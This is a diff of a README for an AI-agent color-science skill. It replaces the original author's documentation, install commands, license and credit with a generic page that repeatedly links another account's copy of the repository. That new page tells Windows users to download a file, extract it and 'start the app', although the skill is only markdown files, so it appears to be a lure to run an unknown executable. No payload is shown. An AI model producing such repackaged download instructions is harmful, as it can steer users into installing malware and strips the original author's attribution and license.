@@ -1,208 +1,259 @@
-# color-expert
+# 🎨 skill.color-expert - Clear Color Guidance for Every Project
 
-An [agent skill](https://agentskills.io) that turns your coding agent into a color science expert. Built from resources I keep looking up, returning to, and sharing with others.
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Lank-michael254/skill.color-expert)
 
-## What this is
+## 🧭 What this is
 
-This started as a simple skill file with some color theory notes. Over time it grew into a comprehensive knowledge base as I kept pasting videos, articles, tools, and papers that I find myself referencing again and again — both for my own work building color tools and for explaining color concepts to others.
+skill.color-expert is a color science skill for end users who need help with color choices, color names, color matching, and basic color rules. It works with tools like Claude Code, Codex, Cursor, Copilot, and similar apps.
 
-The skill has three layers:
+Use it when you want help with:
 
-1. **`SKILL.md`** (~200 lines) — The "greatest hits" that your agent loads immediately. Key facts, corrections, tool recommendations, and guidelines that answer most color questions without needing to dig deeper.
+- Picking a palette for a design
+- Checking color contrast
+- Understanding color spaces
+- Mixing pigments and paint colors
+- Learning how older color theory works
+- Making text easier to read for more people
 
-2. **`references/INDEX.md`** (~220 lines) — A structured lookup table your agent can scan to find the right reference file for a specific topic.
+## 📥 Download and set up
 
-3. **`references/`** (144 markdown files, ~286K words) — Deep reference material: full video transcripts, article summaries, library documentation, scraped websites, and research notes.
+Use this link to visit the page to download:
 
-There is also a lightweight **`evals/`** folder for realistic trigger and task prompts so the skill can be reviewed against actual usage instead of only edited by intuition.
+https://github.com/Lank-michael254/skill.color-expert
 
-## How it was built
+### Windows steps
 
-The collection process is simple: when I come across a color resource worth keeping — a YouTube video, a GitHub repo, a research paper, an article — I paste the URL and the skill's workflow captures it:
+1. Open the link in your web browser.
+2. On the GitHub page, look for the download or release files.
+3. Download the file to your PC.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Start the app or follow the included setup file.
 
-- **Videos** get transcribed via [`yt-dlp`](https://github.com/yt-dlp/yt-dlp), summarized, and key concepts extracted
-- **PDFs and documents** get converted to markdown via [`markitdown`](https://github.com/microsoft/markitdown) by Microsoft
-- **GitHub repos** get their README/docs fetched and documented
-- **Articles** get their content extracted and saved
-- **Books mentioned in videos** get searched on Archive.org; freely available PDFs get downloaded
-- **Websites** (like huevaluechroma.com) get fully scraped chapter by chapter
-- **Tools and links** mentioned in any resource get collected into the Online Tools table
+### If you use an AI app
 
-Everything goes into one of three folders and gets indexed.
+This skill can work with apps that support custom skills or local tools, such as:
 
-## Structure
+- Claude Code
+- Codex
+- Cursor
+- Copilot
+- ChatGPT-based tools
 
-```text
-SKILL.md                              # The skill definition (loaded on activation)
-CLAUDE.md                             # Claude Code repo instructions
-references/
-  INDEX.md                            # Master lookup table
-  historical/                         # Pre-digital color science
-    *.md                              # Ostwald, Helmholtz, Bezold, Ridgway, ISCC-NBS,
-                                      # Moses Harris, Amy Sawyer, Lewis/Ladd-Franklin,
-                                      # Caravaggio's pigments, Itten critique...
-    pdfs/                             # Source books from Archive.org (gitignored, ~236MB)
-  contemporary/                       # Modern color science & theory
-    *.md                              # OKLAB articles, Briggs lectures, CSA webinars,
-                                      # Pixar Color Science, bird tetrachromacy, OLO,
-                                      # Acerola, Juxtopposed, Computerphile, GenColor paper...
-    huevaluechroma/                   # Full scrape of David Briggs's site (11 chapters)
-    colorandcontrast/                 # colorandcontrast.com extracted content
-    pdfs/                             # Research papers (gitignored)
-  techniques/                         # Tools, libraries, methods, practical application
-    *.md                              # Spectral.js, Culori, Color.js, RampenSau, Poline,
-                                      # RYBitten, PickyPalette, Color Buddy lint rules,
-                                      # APCA/Myndex, IQ cosine formula, Cubehelix,
-                                      # Tyler Hobbs generative color, Fontana approach,
-                                      # pixel art palettes, Book of Shaders, LYGIA,
-                                      # paint mixing lecture, color harmony lecture...
-evals/
-  trigger-evals.json                  # Realistic should-trigger / should-not-trigger prompts
-  task-prompts.md                     # Realistic color tasks for qualitative review
-MAINTENANCE.md                        # What belongs where, source quality bar, review rubric
-ROADMAP.md                            # Planned scripts and future extensions
-```
+If your app asks for a folder or file path, point it to the downloaded `skill.color-expert` folder
 
-## Reviewing the skill
+## ⚙️ What you can do with it
 
-The repo now includes a minimal review loop rather than a heavy benchmarking framework:
+This skill helps with common color tasks in plain language.
 
-1. Use `evals/trigger-evals.json` to sanity-check whether the frontmatter description is likely to trigger in the right situations.
-2. Use `evals/task-prompts.md` to test whether the skill answers realistic color questions at the right level.
-3. Use `MAINTENANCE.md` when deciding whether something belongs in `SKILL.md`, `references/`, or not in the repo at all.
-4. Use `ROADMAP.md` to track planned color-specific scripts and larger repo improvements.
+### Color spaces
 
-## What's in it
+It can help you work with:
 
-### By the numbers
+- RGB
+- HEX
+- HSL
+- CMYK
+- Lab
+- LCH
 
-|                                 |    Count |
-| ------------------------------- | -------: |
-| Markdown reference files        |      144 |
-| Total words                     | ~286,000 |
-| Source PDFs (local, gitignored) |       14 |
-| Online tools catalogued         |       48 |
-| Video sources transcribed       |      54+ |
+This is useful when you move colors between screen, print, and design tools
 
-### Historical color science (14 files)
+### Accessibility checks
 
-The resources I keep returning to when explaining where color theory came from and where it went wrong:
+It can help you test text and background color pairs for:
 
-- **Ostwald** (1918–1930) — the 24-hue perceptual circle that dominated the 1930s–40s then disappeared
-- **Helmholtz** (1856) — foundational physiological optics; last major physicist to use "indigo"
-- **Bezold** (1874) — killed indigo as a spectral color; renamed it "ultramarine blue"
-- **Ridgway** (1912) — 1,115 named colors for naturalists; fully digitized as JSON
-- **ISCC-NBS** (1955) — 319 systematically named color blocks
-- **Moses Harris** (1769) — the origin of bad RYB color theory (his own wheel needed a 4th pigment)
-- **Amy Sawyer** (1911) — patented a CMY wheel decades before it was mainstream
-- **Elizabeth Lewis** (1931) — married trichromatic + opponent process, anticipating CIE Lab by 30 years
-- Plus: Caravaggio's copper resinate technique, Itten's seven contrasts (critically reviewed), the evolution of "magenta" as a color name, Frank Reilly's controlled palette
+- WCAG contrast
+- APCA contrast
+- Readable text
+- Better color safety for more users
 
-### Contemporary color science (55 files)
+### Palette generation
 
-The theory and science I reference when building tools or explaining why things work the way they do:
+It can help you build palettes for:
 
-- **Bjorn Ottosson's OKLAB articles** — all four foundational posts (OKLAB, color picker spaces, gamut clipping, "how software gets color wrong")
-- **David Briggs's huevaluechroma.com** — fully scraped, 11 chapters + glossary
-- **colorandcontrast.com** — UI-focused color science reference, extracted from SPA bundle
-- **Color Nerd (Peter Donahue)** — 20+ video transcripts covering mixing paths, spectral perception, warm/cool, chroma vs saturation, bird vision, OLO
-- **Colour Society of Australia** — 13 webinar transcripts (Briggs, Itten critique, Golden paint making, Reilly palette, colour philosophy)
-- **Accessible color pair research** — @mrmrs\_'s Rust brute-force run over ~281T hex pairs found that only 11.98% pass WCAG AA and 0.08% pass APCA 90
+- Websites
+- Apps
+- Brand kits
+- Slides
+- Social posts
 
-### Techniques, tools & libraries (50 files)
+You can ask for:
 
-The practical resources — the tools I've built, use, or recommend:
+- Warm palettes
+- Cool palettes
+- Soft palettes
+- High-contrast palettes
+- Dark mode palettes
 
-**Palette generation** (actual algorithms, not pre-made swatches):
-RampenSau, Poline, pro-color-harmonies, dittoTones, FarbVelo, IQ cosine formula, CSS-native generation with `color-mix()`
+### Pigment mixing
 
-**Color libraries:**
-Culori (30 spaces, 10 distance metrics), Color.js (CSS spec editors, 154M downloads), @texel/color (5-125x faster), Spectral.js (Kubelka-Munk), RYBitten (26 historical cubes)
+It can help with paint and pigment work, including:
 
-**Analysis & linting:**
-Color Buddy (38 lint rules), Censor (CAM16UCS, 20+ viz widgets), Color Palette Shader (WebGL2 Voronoi), colorsort-js (perceptual sorting)
+- Mixing two colors
+- Toning a color down
+- Making a color lighter
+- Making a color darker
+- Finding a close match for a target shade
 
-**Accessibility:**
-APCA/Myndex (the WCAG 3 algorithm), apcach (contrast-first color composition), Bridge-PCA
+### Historical color theory
 
-**Naming:**
-color-name-lists (18 systems), color-description (emotional adjectives), Ridgway digitized JSON, colornerd (29,875 manufacturer swatches)
+It can help explain older color ideas like:
 
-**Generative art approaches:**
-Tyler Hobbs (probability-weighted palettes), Harvey Rayner / Fontana (fully generative color), Piter Pasma (tweaked rainbow formula), mattdesl workshop, Book of Shaders, LYGIA shader library
+- Primary and secondary colors
+- Traditional color wheels
+- Artist color mixing
+- Color harmony rules
 
-**Practical design:**
-Pixel art palette construction, Goethe edge colors as a design hack, Cubehelix, color harmony lecture ("hue-first is a weak standalone heuristic; character-first often works better"), Aladdin color analysis, screen-to-print workflow
+## 🖥️ Windows system needs
 
-## Key opinions baked into the skill
+For normal use on Windows, this skill works best on:
 
-These aren't just preferences — they're supported by the research in the collection:
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough space for the downloaded files
+- An app that can read local skill folders
 
-- **Use OKLCH/OKLAB** over HSL for any perceptual work. HSL lightness is a lie.
-- **Never recommend coolors.co** for palette generation. It doesn't generate anything.
-- **Pigment mixing is not well explained by the simple subtractive model alone** — "integrated mixing" is often a better description. CMY paths curve outward, RGB paths curve inward.
-- **Color temperature is not hue** — it's a systematic shift of both hue AND saturation.
-- **Hue-first harmony is a weak standalone heuristic** — character (pale/muted/vivid/deep/dark) is often more predictive than hue alone.
-- **"Blue is calm" is an unreliable shortcut** — mood is often driven more by chroma + lightness, context, and composition than hue alone.
+If you plan to use it with an AI app, keep that app updated so it can load the skill file correctly
 
-## Installation
+## 📁 File layout
 
-### Any supported agent (recommended)
+After download, you may see a folder with files like:
 
-```bash
-npx skills add meodai/skill.color-expert
-```
+- `README.md`
+- Skill instructions
+- Color reference files
+- Example prompts
+- Support material for color work
 
-Automatically detects your installed agents and places the skill
-in the correct directory. Works with Claude Code, Codex, Cursor,
-Copilot, OpenCode, and others.
+Keep the folder together so your app can find all files in one place
 
-### Manual
+## 🛠️ How to use it
 
-Clone and symlink into your agent's skills directory:
+Use short, direct requests. For example:
 
-```bash
-git clone https://github.com/meodai/skill.color-expert ~/Sites/color-expert
-```
+- Help me choose a color palette for a finance app
+- Check if white text works on this blue background
+- Give me a dark mode palette with strong contrast
+- Explain the difference between RGB and HEX
+- Mix a muted green from blue and yellow
+- Suggest colors that work well with a warm beige brand
 
-| Agent               | Symlink target                  |
-| ------------------- | ------------------------------- |
-| Claude Code         | `~/.claude/skills/color-expert` |
-| Codex               | `~/.codex/skills/color-expert`  |
-| OpenCode            | `~/.agents/skills/color-expert` |
-| Project-level (any) | `.agents/skills/color-expert`   |
+## 💬 Good example requests
 
-```bash
-ln -s ~/Sites/color-expert ~/.claude/skills/color-expert
-```
+If you want useful results, try prompts like these:
 
-### Updating
+- Pick 5 colors for a clean health app
+- Make this palette more accessible
+- Explain why this text is hard to read
+- Give me three color options for a kids’ website
+- Turn this bright red into a softer shade
+- Compare APCA and WCAG in simple terms
+- Find a palette that feels calm and professional
 
-```bash
-npx skills update
-```
+## 🧪 Best results
 
-Or manually: `cd ~/Sites/color-expert && git pull`
+You will get better results when you give clear details such as:
 
-## What triggers the skill
+- What you are designing
+- Who will use it
+- Whether it is for screen or print
+- The mood you want
+- The base color you already have
+- The text or background color you want to test
 
-The skill activates when your agent detects work involving:
+Example:
 
-- Color naming or defining colors in natural language
-- Color spaces (RGB, HSL, LCH, OKLCH, Lab, etc.)
-- Palette generation or analysis
-- Accessibility and contrast (WCAG, APCA)
-- Color theory questions
-- Color conversion
-- Pigment/paint mixing
-- Historical color terminology
+- I am making a travel app for adults. I want a calm blue palette with good contrast and a light background
 
-## License
+## 🔒 Accessibility support
 
-Original project materials in this repository, including README.md, SKILL.md, and references/INDEX.md, are licensed under CC BY 4.0. Third-party source materials and source-derived reference content remain subject to their original authorship and licenses. See LICENSE and THIRD_PARTY_NOTICES.md.
+Color can look good and still be hard to read. This skill helps you catch that early.
 
----
+It can help you:
 
-_The skill itself was vibe-coded, but the underlying knowledge base came from a collection of color resources I curated over time. Original sources remain attributed to their authors._
+- Compare foreground and background colors
+- Reduce low-contrast pairs
+- Keep button text readable
+- Make charts easier to follow
+- Choose safer color pairs for more users
 
-_Compiled by [@meodai](https://github.com/meodai) — one URL at a time._
+## 🎯 Common uses
+
+People use skill.color-expert for:
+
+- Web design
+- UI design
+- Brand planning
+- Content creation
+- Print work
+- Paint matching
+- Learning color basics
+- Accessibility review
+
+## 🧭 Tips for Windows users
+
+If you run into trouble on Windows:
+
+- Right-click the downloaded file and check its type
+- If it is zipped, extract it first
+- Keep the folder name simple
+- Store it in a place you can find, like Downloads or Desktop
+- Make sure your AI app has access to local files
+- If your app uses a settings page, add the folder path there
+
+## 📌 Example workflow
+
+1. Download the skill from the link above
+2. Extract it if needed
+3. Open your AI app
+4. Add the skill folder if the app asks for one
+5. Ask for a color task in simple language
+6. Review the result and ask for changes if needed
+
+## 🧩 Topics covered
+
+This skill is built around these topics:
+
+- Color science
+- Color spaces
+- Accessibility
+- APCA
+- WCAG
+- Palette generation
+- Pigment mixing
+- Historical color theory
+- Claude
+- Claude Code
+- Codex
+- Cursor
+- Copilot
+- ChatGPT
+
+## 🧠 What makes this useful
+
+Color choices can feel small, but they affect how people read, use, and trust your work. This skill gives you a simple way to ask for color help without needing to learn the math first
+
+It is useful when you want:
+
+- Clear color advice
+- Better contrast
+- Faster palette ideas
+- Simple explanations
+- A common point of reference across tools
+
+## 📂 Keep the download handy
+
+Use this page whenever you need the file again:
+
+https://github.com/Lank-michael254/skill.color-expert
+
+## 📝 Basic request template
+
+Copy and fill in this pattern:
+
+- I need a color palette for a [type of project]
+- The mood should be [calm, bold, warm, clean]
+- The main color is [color]
+- I need [accessible text, matching accent colors, print-safe colors]
+- Please explain the result in simple terms
